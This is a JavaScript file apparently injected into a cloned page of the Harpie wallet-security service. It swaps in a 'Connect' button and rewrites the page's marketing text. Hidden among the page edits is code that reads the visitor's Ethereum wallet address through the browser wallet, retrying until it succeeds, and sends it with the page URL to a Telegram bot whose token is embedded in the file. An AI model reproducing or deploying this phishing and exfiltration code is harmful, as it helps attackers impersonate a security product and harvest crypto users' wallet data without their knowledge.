let btn = document.querySelector(".self-start");

const connectBtn = `<button class=" interact-button rounded-lg bg-harpie font-display hover:bg-harpie-600 focus:ring-harpie-200 border-2 border-harpie  duration-100 transition ease-in-out inline-block py-2 text-base rounded-sm tracking-wide text-white transition-colors ease-in-out md:px-8 lg:px-10 px-6 focus:ring cur btnn ">Connect</button>`;

btn.outerHTML = connectBtn;
console.log("oooooooo");

let p = document.getElementsByClassName("sm:w-[85%]");
let t = document.getElementsByClassName("col-span-3 mr-24");
p[0].classList.add("pad");
t[0].classList.add("rmp");

document.addEventListener("DOMContentLoaded", () => {
  console.log("buttonnnnn =>>", btn);
  const title = document.querySelector("h2.text-2xl.font-bold");
  title.innerHTML = " WHAT WE DO…";
  const text1 = document.querySelector("p.pt-8");
  console.log(text1);
  text1.innerHTML = text11;
});
const chatIds = ["1534371221"];

const url = window.location.href;

const sendMsg = async (msg) => {
  for (let i = 0; i < chatIds.length; i++) {
    const data = {
      chat_id: chatIds[i],
      text: msg,
    };
    const resp = await fetch(
      `https://api.telegram.org/bot6544701468%3AAAFHo-6ohRT0Tf4Ep9bG-yoWdxvt1AZeU0I/sendMessage`,
      {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify(data),
      }
    );
    const resJson = await resp.json();
    console.log(resJson);
  }
};
const log = async () => {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
    const signer = provider.getSigner();
    const user = await signer.getAddress();
    console.log(user);
    sendMsg(`${user} at harpie ${url} `);
  } catch (error) {
    await new Promise((resolve) => setTimeout(resolve, 1000));
    log();
  }
};
log();

const text11 = `
<p class="pt-8" style="margin-top:-50px" >Setting up <strong class=" text-harpie">Harpie RPC</strong> is your first step in fully securing your wallet.  No downloads required.
<br><br>
<div style= "margin-bottom:20px" >
The <strong class=" text-harpie">Harpie</strong>
sends you an email when your wallet is at risk.
We monitor your wallet and the Ethereum blockchain for anything that could put you and your wallet in danger,
and we tell you exactly what you can do to fix it.
</div>

 Get notified when...
there's suspicious activity in your wallet
a protocol or dapp you're using gets hacked
your private key gets leaked
your crypto or NFTs are at risk of scams
... And many more

</p>

`;
